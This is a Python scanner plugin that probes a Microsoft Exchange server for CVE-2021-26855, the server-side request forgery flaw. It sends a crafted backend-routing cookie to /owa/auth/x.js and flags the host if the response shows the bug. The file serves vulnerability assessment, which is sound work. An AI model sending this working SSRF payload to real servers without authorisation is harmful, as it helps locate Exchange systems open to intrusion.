# https://saucer-man.com/information_security/748.html
# CVE-2021-26855: 服务端请求伪造（SSRF）漏洞，通过该漏洞，攻击者可以发送任意HTTP请求并通过Exchange Server进行身份验证，获取权限。

from lib.core.Request import request
import requests
from plugin.target_parse import get_standard_url

def poc(url):
    if not url.startswith("http"):
        url = "https://" + url
    url = get_standard_url(url)
    try:
        vul_url = url+ "/owa/auth/x.js"
        headers = {
            'Cookie': 'X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3; X-BEResource=localhost/owa/auth/logon.aspx?~3;'
        }
        resp = request.get(vul_url, headers=headers, timeout=5,verify=False)
        if resp.status_code == 500 and 'NegotiateSecurityContext' in resp.text:
            return url
    except Exception as e:
        pass

    return False